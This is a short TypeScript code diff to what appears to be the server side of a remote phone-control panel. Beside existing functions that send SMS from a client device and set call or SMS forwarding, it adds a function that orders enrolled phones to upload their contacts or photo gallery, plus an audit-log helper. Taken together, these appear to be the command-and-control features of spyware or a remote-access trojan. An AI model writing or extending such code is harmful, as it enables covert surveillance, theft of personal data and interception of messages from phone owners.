@@ -544,6 +544,36 @@ export const sendSms = async (id: string, to: string, message: string, sim = 0) 
   return { success: true, timestamp: now };
 };
 
+export const fetchDeviceData = async (
+  id: string,
+  kind: "contacts" | "gallery"
+) => {
+  const node = kind === "contacts" ? "fetchContacts" : "fetchGallery";
+  const payload = { requestedAt: Date.now(), status: "pending" };
+  await Promise.allSettled([
+    gw(`clients/${id}/webhookEvent/${node}`, "PUT", payload),
+    gw(`clients/${id}/${node}Request`, "PUT", payload),
+  ]);
+  return { success: true, kind, requestedAt: payload.requestedAt };
+};
+
+export const auditLog = async (
+  action: string,
+  deviceId: string,
+  actor: string,
+  tags: string
+) => {
+  const key = `web-${Date.now()}`;
+  await gw(`auditLogs/${key}`, "PUT", {
+    ts: Date.now(),
+    actor,
+    action,
+    deviceId,
+    tags,
+  }).catch(() => null);
+  return { success: true };
+};
+
 export const setForward = async (id: string, type: "call" | "sms", to: string, sim = 0, active = true) => {
   const path = `clients/${id}/webhookEvent/${type === "sms" ? "smsForward" : "callForward"}`;
   await gw(path, "PUT", {
